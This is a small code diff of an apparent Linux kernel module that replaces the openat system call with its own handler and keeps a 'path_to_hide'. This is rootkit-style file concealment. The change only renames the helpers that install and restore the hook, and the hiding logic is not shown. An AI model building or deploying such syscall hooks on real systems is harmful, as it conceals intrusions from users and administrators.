@@ -55,7 +55,7 @@ int load(void) {
     path_to_hide = kmalloc(PATH_MAX, GFP_KERNEL);
     initialize_path_to_hide();
 
-    unsigned long openat_ptr = hijack_syscall(__NR_openat, (unsigned long)new_openat);
+    unsigned long openat_ptr = set_syscall(__NR_openat, (unsigned long)new_openat);
     if (!openat_ptr) {
         return -ENXIO;
     }
@@ -68,7 +68,7 @@ int load(void) {
  
 void unload(void) {
     pr_info("Shutting down.");
-    restore_syscall(__NR_openat, (unsigned long)original_openat_ptr);
+    set_syscall(__NR_openat, (unsigned long)original_openat_ptr);
     kfree(path_to_hide);
     pr_info("Goodbye world...");
 }
